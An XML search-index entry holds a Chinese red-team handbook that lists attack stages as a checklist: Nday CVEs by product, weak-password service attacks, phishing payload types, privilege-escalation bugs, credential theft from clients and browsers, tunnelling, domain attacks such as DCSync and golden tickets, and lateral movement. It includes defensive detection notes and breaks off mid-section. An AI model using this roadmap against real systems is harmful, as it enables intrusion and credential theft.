<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红方人员实战手册</title>
      <link href="2021/05/31/%E7%BA%A2%E6%96%B9%E4%BA%BA%E5%91%98%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C/"/>
      <url>2021/05/31/%E7%BA%A2%E6%96%B9%E4%BA%BA%E5%91%98%E5%AE%9E%E6%88%98%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="红方人员实战手册"><a href="#红方人员实战手册" class="headerlink" title="红方人员实战手册"></a>红方人员实战手册</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><pre><code>Author : By klionDate   : 2020.2.15寄语    : 愿 2020 后面的每一天都能一切安好</code></pre><h3 id="分享初衷"><a href="#分享初衷" class="headerlink" title="分享初衷"></a>分享初衷</h3><pre><code>一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事</code></pre><h3 id="丑话说在前面"><a href="#丑话说在前面" class="headerlink" title="丑话说在前面"></a>丑话说在前面</h3><pre><code>严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担</code></pre><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><pre><code>以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</code></pre><h3 id="日常流程简要说明"><a href="#日常流程简要说明" class="headerlink" title="日常流程简要说明"></a>日常流程简要说明</h3><pre><code>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护</code></pre><h3 id="0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心"><a href="#0x01-入口权限获取-前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心" class="headerlink" title="0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]"></a>0x01 入口权限获取 [ 前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心 ]</h3><pre><code>绕CDN找出目标所有真实ip段找目标的各种Web管理后台登录口批量抓取目标所有真实C段 Web banner批量对目标所有真实C段 进行基础服务端口扫描探测识别尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破批量抓取目标所有子域 Web banner批量对目标所有子域集中进行基础服务端口探测识别批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]目标Svn里泄露的各类 敏感文件网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]目标站点自身在前端代码中泄露的各种敏感信息fofa / shodan / bing / google  hacking 深度利用搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息目标微信小程序分析目标app Web请求借助js探针搜集目标内网信息想办法混入目标的各种 内部QQ群 / 微信群分析目标直接供应商 [尤其是技术外包]根据前面已搜集到的各类信息制作有针对性的弱口令字典目标所用 Waf 种类识别 与 绕过BypassWAF 文件上传 / 读取 / 下载   BypassWAF Sql注入   BypassWAF RCE   BypassWAF 各类Java Web中间件已知Nday漏洞利用   BypassWAF Webshell 免杀    其它更多 , 待补充修正...</code></pre><h3 id="0x02-入口权限获取-外部防御重心-“重中之重”"><a href="#0x02-入口权限获取-外部防御重心-“重中之重”" class="headerlink" title="0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]"></a>0x02 入口权限获取 [ 外部防御重心 ( “重中之重” ) ]</h3><pre><code>此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;</code></pre><h4 id="针对各类Java中间件的各种已知Nday漏洞利用"><a href="#针对各类Java中间件的各种已知Nday漏洞利用" class="headerlink" title="针对各类Java中间件的各种已知Nday漏洞利用"></a>针对各类Java中间件的各种已知Nday漏洞利用</h4><pre><code>不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑所以拿到的shell权限一般也非常高,通常都直接是服务器权限尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的</code></pre><ul><li><p>Struts2</p><pre><code>Struts2-005Struts2-008Struts2-009Struts2-013Struts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)Struts2-019Struts2-020Struts2-devmodeStruts2-032Struts2-033Struts2-037Struts2-045Struts2-046Struts2-048Struts2-052Struts2-053Struts2-057</code></pre></li><li><p>weblogic<br>```<br>CVE-2019-2725<br>CVE-2019-2729<br>CVE-2018-3191<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2018-2894<br>CVE-2017-3506<br>CVE-2017-10271<br>CVE-2017-3248<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2015-4852<br>CVE-2014-4210</p></li></ul><p>SSRF<br>控制台弱口令,部署webshell</p><pre><code>+ Jboss</code></pre><p>CVE-2015-7501<br>CVE-2017-7504<br>CVE-2017-12149</p><p>未授权访问,部署webshell<br>控制台弱口令,部署webshell</p><pre><code>+ wildfly [ jboss 7.x 改名为 wildfly ]</code></pre><p>控制台弱口令,部署webshell</p><pre><code>+ Tomcat</code></pre><p>CVE-2016-8735<br>CVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]<br>CVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]</p><p>控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]</p><pre><code>+ Jekins</code></pre><p>CVE-2018-1999002 [任意文件读取]</p><p>未授权访问,任意命令执行<br>控制台弱口令,任意命令执行</p><pre><code>+ ElasticSearch</code></pre><p>CVE-2014-3120 [专门针对老版本(无沙盒)RCE]<br>CVE-2015-1427 [Groovy RCE]<br>CVE-2015-3337 [任意文件读取]</p><p>未授权访问,敏感信息泄露</p><pre><code>+ RabbitMQ</code></pre><p>弱口令</p><pre><code>+ Glassfish</code></pre><p>任意文件读取 [ 低版本 ]<br>控制台弱口令,部署webshell</p><pre><code>+ IBM Websphere</code></pre><p>Java 反序列化<br>控制台弱口令,部署webshell</p><pre><code>+ Axis2</code></pre><p>任意文件读取<br>目录遍历</p><pre><code>+ Apache ActiveMQ</code></pre><p>未授权访问,5.12 之前的版本 fileserver存在 PUT任意写<br>CVE-2015-5254</p><pre><code>+ Apache Solr</code></pre><p>CVE-2017-12629<br>CVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]</p><pre><code>+ Apache Zookeeper</code></pre><p>未授权访问,敏感信息泄露</p><pre><code>+ Apache Shiro反序列化+ fastjson &lt;= 1.2.47 反序列化利用####  针对各类Windows php集成环境  [ 由于此类环境拿到的Webshell权限相对较高,所以,通常也是红队人员的首选突破口 ]</code></pre><p>AppServ<br>Xampp<br>宝塔<br>PhpStudy<br>……</p><pre><code>#### 针对各类开源程序的 已知Nday漏洞利用</code></pre><p>Dedecms     后台弱口令,系列已知nday漏洞利用<br>thinkphp 5.x     后台弱口令,系列已知nday漏洞利用<br>phpcms         后台弱口令,系列已知nday漏洞利用<br>ecshop         后台弱口令,系列已知nday漏洞利用<br>Metinfo     后台弱口令,系列已知nday漏洞利用<br>discuz         后台弱口令,系列已知nday漏洞利用<br>帝国cms     后台弱口令,系列已知nday漏洞利用<br>phpmyadmin     数据库弱口令,系列已知nday漏洞利用<br>wordpress     后台弱口令,系列已知nday漏洞利用<br>joomla         后台弱口令,系列已知nday漏洞利用<br>drupal         CVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用<br>……</p><pre><code>#### 针对其它各类Web组件的 已知Nday漏洞利用+ IIS 6.0 RCE</code></pre><p>短文件漏洞<br>PUT 任意写<br>Webdav RCE CVE-2017-7269</p><pre><code>+ 禅道项目管理系统</code></pre><p>SQL注入<br>文件读取<br>远程执行</p><pre><code>+ 通达OA</code></pre><p>SQL注入<br>任意上传</p><pre><code>+ Exchange</code></pre><p>利用接口进行邮箱用户名枚举<br>针对各个接口的弱口令爆破<br>CVE-2020-0688 [ 利用前提是需要先得有任意一个邮箱用户权限 ]<br>….</p><pre><code>+ Zimbra [ XXE + SSRF =&gt; RCE ]</code></pre><p>CVE-2013-7091<br>CVE-2016-9924<br>CVE-2019-9670</p><pre><code>+ Citrix</code></pre><p>CVE-2019-19781</p><pre><code>+ Jumpserver</code></pre><p>身份验证绕过</p><pre><code>+ Zabbix</code></pre><p>CVE-2017-2824<br>SQL注入 [ 2.0 老版本 ]<br>控制台弱口令,敏感机器信息泄露</p><pre><code>+ Cacti</code></pre><p>低版本 SQL注入<br>控制台弱口令</p><pre><code>+ Nagios</code></pre><p>CVE-2016-9565<br>控制台弱口令</p><pre><code>+ Webmin RCE</code></pre><p>CVE-2019-15107 </p><pre><code>+ PHPMailer</code></pre><p>CVE-2016-10033</p><pre><code>+ 泛微OA远程代码执行+ 金蝶OA SQL注入+ Coremail 敏感文件泄露+ UEditor 任意文件上传+ OpenSSL心脏滴血抓明文账号密码  [ Heartbleed ]+ 破壳漏洞 [ Shellshock ] #### 各种能快速getshell的常规基础Web漏洞利用 [ 注: 有些漏洞在不审代码的情况下其实是很难有效盲测到的 ]</code></pre><p>后台弱口令<br>SSRF<br>sql注入<br>越权<br>命令 / 代码执行 / 反序列化<br>任意文件上传 / 下载 / 读取<br>包含<br>XSS（实际上,XSS只有在针对某些特定邮箱,手里有浏览器0day时价值才会比较大,红队场景下其实并不是非常致命)<br>业务逻辑漏洞</p><pre><code>#### 针对各类边界网络设备的各种利用,主要是Web管理控制台登录弱口令 及 各类已知nday攻击利用+ Pulse Secure VPN</code></pre><p>CVE-2019-11510 [ 任意文件读取 ]</p><pre><code>+ Fortinet VPN</code></pre><p>CVE-2018-13379 [ 文件读取 ]</p><pre><code>+ Sangfor Vpn RCE### 0x03 入口权限获取 [ 专门针对各类基础服务端口的各种getshell利用，防御重点 ( &quot;重中之重&quot; ) ]</code></pre><p>此处仅仅只挑选了一些实战中真正能协助快速getshell的服务,其它的一些相对边缘性的服务均未提及<br>同样,已按 “实际攻击利用的难易程度” 及 “获取到的shell权限高低” 为标准进行了详细排序<br>如下,就每个端口的具体攻击利用方式,进行了简要说明</p><pre><code>* Top Port List</code></pre><p>Mssql       [ 默认工作在tcp 1433端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>SMB       [ 默认工作在tcp 445端口, 弱口令, 远程执行, 后门植入 ]<br>WMI       [ 默认工作在tcp 135端口, 弱口令, 远程执行, 后门植入 ]<br>WinRM      [ 默认工作在tcp 5985端口, 此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入 ]<br>RDP       [ 默认工作在tcp 3389端口, 弱口令, 远程执行, 别人留的shift类后门 ]<br>SSH       [ 默认工作在tcp 22端口, 弱口令, 远程执行, 后门植入 ]<br>ORACLE    [ 默认工作在tcp 1521端口, 弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入 ]<br>Mysql     [ 默认工作在tcp 3306端口, 弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统) ]<br>REDIS      [ 默认工作在tcp 6379端口, 弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权 ]<br>POSTGRESQL[ 默认工作在tcp 5432端口, 弱口令, 敏感信息泄露 ]<br>LDAP      [ 默认工作在tcp 389端口, 未授权访问, 弱口令, 敏感账号密码泄露 ]<br>SMTP      [ 默认工作在tcp 25端口, 服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露 ]<br>POP3      [ 默认工作在tcp 110端口, 弱口令, 敏感信息泄露 ]<br>IMAP      [ 默认工作在tcp 143端口, 弱口令, 敏感信息泄露 ]<br>Exchange  [ 默认工作在tcp 443端口, 接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 … ]<br>VNC       [ 默认工作在tcp 5900端口, 弱口令 ]<br>FTP       [ 默认工作在tcp 21端口, 弱口令, 匿名访问/可写, 敏感信息泄露 ]<br>Rsync     [ 默认工作在tcp 873端口, 未授权, 弱口令, 敏感信息泄露 ]<br>Mongodb   [ 默认工作在tcp 27017端口, 未授权, 弱口令 ]<br>TELNET    [ 默认工作在tcp 23端口, 弱口令, 后门植入 ]<br>SVN       [ 默认工作在tcp 3690端口, 弱口令, 敏感信息泄露 ]<br>JAVA RMI  [ 默认工作在tcp 1099端口, 可能存在反序列化利用 ]<br>CouchDB   [ 默认工作在tcp 5984端口, 未授权访问 ]</p><pre><code>### 0x04 入口权限获取#### 传统钓鱼攻击利用，实际护网场景中用的非常频繁，细节非常多，此处不一一列举，防御重点* 发信前期准备</code></pre><p>枚举有效的目标邮箱用户名列表<br>批量探测目标邮箱弱口令<br>伪造发信人 [ 发信邮服搭建 ]<br>钓鱼信 [ 针对不同行业一般也都会事先准备好各种各样的针对性的发信话术模板,以此来提到实际发信成功率 ]<br>……</p><pre><code>* 典型投递方式 </code></pre><p>第一种,直接给目标发送各种常规木马信 </p><p>传统宏利用<br>捆绑<br>exe[zip,7z]<br>lnk<br>chm<br>自解压<br>木马链接<br>OLE<br>CVE-2017-11882 [ 利用漏洞触发 ]<br>…</p><pre><code></code></pre><p>第二种,给目标发送各种钓鱼链接,比如, 利用各种目标登录口的钓鱼页面来窃取各种内网账号密码 </p><p>Vpn<br>Mail<br>OA<br>Net ntlm hash [ 远程模板注入,pdf…钓hash,国内ISP过滤SMB流量不适用 ]<br>……</p><pre><code>### 0x05 主机安全 [ 提权利用，防御重点 ]</code></pre><p>以下只单独挑了一些在 通用性, 稳定性, 易用性, 实际成功率 都相对较好的洞 和 方式 其它的一些”边缘性”的利用都暂未提及</p><pre><code>* Windows 系统漏洞 本地提权 [ 成功的前提是,保证事先已做好各种针对性免杀 ]</code></pre><p>BypassUAC [ win7 / 8  / 8.1 / 10 ]<br>MS14-058[KB3000061]                    [重点]<br>MS14-068[KB3011780]                    [重点]<br>ms15-051[KB3045171]                    [重点]<br>MS15-077[KB3077657]                    [重点]<br>MS16-032[KB3124280]                    [重点]<br>ms16-075                        [重点]<br>MS16-135[KB3199135]                    [重点]<br>MS17-010[KB4013389]                    [重点]<br>cve-2019-0708                        [重点]<br>CVE-2019-0803                        [重点]<br>CVE-2019-1322 &amp; CVE-2019-1405                [重点]<br>cve-2019-12750 [ 赛门铁克(用的较多)本地提权 ]        [重点]        </p><pre><code>* linux 内核漏洞 本地提权 [ linux-exploit-suggester ]</code></pre><p>CVE-2016-5195                        [重点]<br>CVE-2017-16995<br>CVE-2019-13272</p><pre><code>* 利用各类第三方服务 / 软件工具提权</code></pre><p>Mssql                             [重点]<br>Oracle                                 [重点]<br>Mysql<br>各类第三方软件dll劫持                     [重点]<br>suid权限<br>计划任务<br>各种错误服务配置利用</p><pre><code>### 0x06 内网安全 [ 敏感信息搜集，防御重点，可在此项严格限制各种系统内置命令执行 ]    * 搜集当前已控&quot;跳板机&quot;的各类敏感信息</code></pre><p>注: 如下某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的,此处不再赘述</p><p>查看当前shell权限 及 详细系统内核版本<br>获取当前系统的 详细ip配置,包括 所在域, ip, 掩码, 网关, 主备 dns ip<br>获取当前系统最近的用户登录记录<br>获取当前用户的所有命令历史记录 [ 主要针对linux,里面可能包含的有各类敏感账号密码,ip,敏感服务配置… ]<br>获取本机所有 服务/进程 [包括各个进程的详细权限,也包括目标系统中的可疑恶意进程(有可能是同行的马)]/端口/网络连接信息<br>获取本机所用杀软 / 监控种类 [ 后续好针对性的做免杀 ]<br>获取本机 rdp / ssh 端口开启状态 及 其默认端口号<br>获取本机所有用户的rdp外连记录<br>获取本机的所有SSH登录记录<br>获取当前系统所有登录成功的日志 [ 针对windows ]<br>获取本机所有已安装软件的详细列表 [ 主要为抓密码,提权,留后门做准备 ]<br>获取本机各个浏览器中保存的 所有书签页 及 历史浏览记录<br>获取当前用户创建的所有计划任务列表 及 计划任务所对应的执行脚本内容 [ 有些执行脚本中很可能存的有各种连接账号密码 ]<br>获取当前用户 桌面 及 回收站 里的所有文件列表<br>获取当前系统的所有存在suid权限的二进制程序<br>获取当前系统代理 [ ip &amp; 端口 ]<br>获取当前系统所有的自启动注册表项值<br>获取当前系统的所有 ipc 连接 及 已启用共享<br>获取当前系统的所有挂载[mount]<br>获取当前系统的防火墙状态<br>获取当前系统所有分区/盘符及其详细使用情况<br>获取本机的累计开机时长<br>获取本机arp / dns缓存<br>获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby…等语言的执行环境,后期可设法利用 ]<br>获取当前系统所有本地用户及组列表<br>获取当前系统host文件内容<br>获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]<br>远程截屏捕捉目标用户敏感操作</p><p>由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</p><pre><code>* 利用当前已控 &quot;跳板机&quot;, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布 * 批量抓取内网所有windows机器名 和 所在 &quot;域&quot; / &quot;工作组名&quot; [smb探测扫描]* 针对内网的各种高危敏感服务定位[&quot;安全&quot; 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]* 内网批量 Web Banner 抓取,获取关键目标业务系统如下</code></pre><p>内网各种文件[共享]服务器<br>内网各类web服务器  [ 可用于后期留入口 ]<br>内网各类数据库服务器<br>内网邮件服务器  [ 可用于后期留入口 ]<br>内网Vpn服务器  [ 可用于后期留入口 ]<br>内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti…<br>内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端…<br>内网日志服务器<br>内网补丁服务器<br>内网各类OA,ERP,CRM,SRM,HR系统…<br>内网打印服务器<br>内网 MES 系统<br>内网虚拟化服务器 / 超融合平台 [Vmware ESX]<br>内网堡垒机…<br>内网运维,研发 部门员工的机器<br>内网路由,交换设备…<br>等等等…</p><p>针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现<br>通过在一些关键节点设备/服务器上部署探针搜集流量<br>再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的</p><pre><code>* 针对各类已知系统高危RCE漏洞的批量探测识别与利用</code></pre><p>MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]<br>MS17-010<br>CVE-2019-0708</p><p>其实针对此类漏洞的攻击利用识别,就显得比较直白了<br>通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断</p><pre><code>### 0x07 内网安全  [ 各类敏感凭证 &quot;搜集&quot; 与 &quot;窃取&quot; ]* 主动密码搜集 </code></pre><p>注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的<br>此处不再赘述, 此项非防御重点, 因为压根也不好防</p><p>批量抓取当前机器上的 “各类基础服务配置文件中保存的各种账号密码”<br>   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic…)…<br>想办法 “控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表”<br>   比如, <em>.ls,</em>.doc,*.docx, *.txt….<br>抓取各类 “数据库客户端工具中保存各种数据库连接账号密码<br>   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</p><p>抓取当前系统 “注册表中保存的各类账号密码hash” [ Windows ]<br>抓取当前系统所有 “本地用户的明文密码/hash” [ Windows &amp; linux ]<br>抓取当前系统的所有 “用户token” [ Windows ]<br>抓取 “windows凭据管理器中保存的各类连接账号密码”<br>抓取 “MSTSC 客户端中保存的所有rdp连接账号密码”<br>抓取各类 “VNC客户端工具中保存的连接密码”<br>抓取 “GPP目录下保存的各类账号密码” [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]<br>抓取各类 “SSH客户端工具中保存的各种linux系统连接账号密码”, SecureCRT,Xshell,WinSCP,putty<br>抓取各类 “浏览器中保存的各种web登录密码”,Chrome [360浏览器],Firefox,IE,QQ浏览器<br>抓取各类 “数据库表中保存的各类账号密码hash”<br>抓取各类 “FTP客户端工具中保存的各种ftp登录账号密码”, filezila, xftp…<br>抓取各类 “邮件客户端工具中保存的各种邮箱账号密码”, forxmail, thunderbird…<br>抓取各类 “SVN客户端工具中保存的所有连接账号密码及项目地址”<br>抓取各类 “VPN客户端工具中保存的各种vpn链接账号密码”</p><pre><code>* 被动密码搜集 [ 等着管理员自己来送密码 ] </code></pre><p>[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]</p><p>Windows SSP [持久化/内存]<br>Hook PasswordChangeNotify [持久化/内存]<br>OWA 登录账号密码截获<br>截获mstsc.exe中输入的rdp连接账号密码<br>linux 别名记录利用<br>本机明文密码嗅探 [ http,ftp,pop3… ]<br>传统键盘记录<br>windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</p><pre><code>* Hash爆破:</code></pre><p>Hashcat [ 完全拼GPU ] </p><pre><code>### 0x08 内网安全 [ 内网常用 &quot;隧道&quot;&quot; / &quot;转发&quot;&quot; / &quot;代理&quot;&quot; 穿透手法 提炼汇总 ，防御重点 ]</code></pre><p>出网流量刺探<br>比如,http,dns,以及一些穿透性相对较好的tcp端口…<br>这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</p><p>常规 HTTP脚本代理<br>abptts,Neo-reGeorg,reGeorg,tunna,reduh…<br>不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</p><p>SSH 隧道<br>加密端口转发,socks 实战用途非常灵活,此处不细说 ]</p><p>Rdp 隧道</p><p>反向SOCKS<br>nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks …<br>工具基本都不免杀了,需要自行处理</p><p>正反向TCP 端口转发<br>非常多,就不一一列举, eg: nginx,netsh,socat,ew….</p><p>DNS加密隧道            </p><p>Web端口复用</p><p>需要明白的是,在一般的红队场景中<br>入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</p><pre><code>### 0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]    * 针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</code></pre><p>获取当前域内的完整域管列表<br>获取当前域内的所有域控机器名列表<br>获取当前域内的所有DNS服务器机器名列表<br>获取当前域内的所有SPN<br>获取当前域内的所有OU<br>获取当前域内的所有用户 &amp; 用户组列表<br>获取当前域信任关系 [ 跨域渗透 ]<br>获取当前域内所有机器的开机时间<br>获取当前域内网段及web站点<br>获取当前域内策略 [ 主要是为了了解密码策略 ]<br>获取当前域林<br>…….</p><pre><code>* 快速获取目标域控权限的一些常规手法</code></pre><p>搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ]<br>服务票据hash破解(“尤其是域管用户的”) [ kerberoast ]<br>批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]<br>Kerberos 委派利用<br>爆破LDAP<br>Exchange特定ACL滥用<br>SSP 截获关键服务器登录密码<br>利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞… ],在内网循环抓各类密码,直至<br>  抓到域管密码<br>  抓到域管令牌<br>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]<br>LAPS<br>MS14-068 [ 如今实际中已很少遇到了 ]<br>LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</p><pre><code>* 域内后渗透敏感信息搜集分析</code></pre><p>获取所有DNS记录<br>导出当前域的完整LDAP数据库<br>提取当前域的ntds.dit [ 域内账号密码数据库 ]<br>  Dcsync同步<br>  Volume Shadow Copy Service</p><pre><code>* 域内指定用户登录ip定位</code></pre><p>利用OWA登录日志<br>利用域控服务器登录日志<br>指定服务银票 [ Silver Ticket ]<br>除此之外,就是下面的各类常规横向手法</p><pre><code>* 域内指定用户机器定向控制技巧</code></pre><p>绑定用户登录脚本<br>利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]<br>PTT [ 票据传递 ]</p><pre><code>* 针对域管的各种权限维持技巧</code></pre><p>金票<br>Skeleton Key<br>DSRM密码同步<br>OWA后门<br>…</p><pre><code>* 域内Exchange 邮件数据脱取</code></pre><p>利用Ews接口通过PTH的方式脱邮件</p><pre><code>### 0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( &quot;重中之重&quot; ) ]    * 从 Windows平台 横向至  Windows平台</code></pre><p>注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限</p><p>远程服务管理 [ SCM ]<br>远程创建执行计划任务 [ Scheduled Tasks ]<br>WMI 远程执行 [ WMI ]<br>针对高版本Windows 的WinRM 远程执行<br>DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]<br>高版本 RDP 远程执行<br>利用MSSQL数据库存储过程来变相远程执行<br>利用Oracle数据库存储过程来变相远程执行<br>SMB [ PTH (hash传递) ]<br>RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]<br>利用补丁服务器下发执行<br>利用EDR主控端定向下发执行</p><pre><code>* 从 Windows平台 横向至 *inux平台</code></pre><p>plink 或者 基于Windows SSH库自行开发各种远程执行小工具</p><pre><code>* 从 *inux平台 横向至 Windows 平台</code></pre><p>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下<br>wmiexec_linux_x86_64<br>smbexec_linux_x86_64<br>psexec_linux_x86_64<br>atexec_linux_x86_64<br>dcomexec_linux_x86_64</p><p>另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</p><pre><code>* 从 *inux平台 横向至 *inux 平台</code></pre><p>linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</p><pre><code>* 各种远程下载技巧</code></pre><p>wget [ win &amp; linux ]<br>curl [ win &amp; linux ]</p><pre><code></code></pre><p>之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道<br>某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可</p><p>CertUtil.exe<br>Bitsadmin.exe<br>Regsvr32.exe<br>Rundll32.exe<br>Powershell.exe<br>……</p><pre><code>### 0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 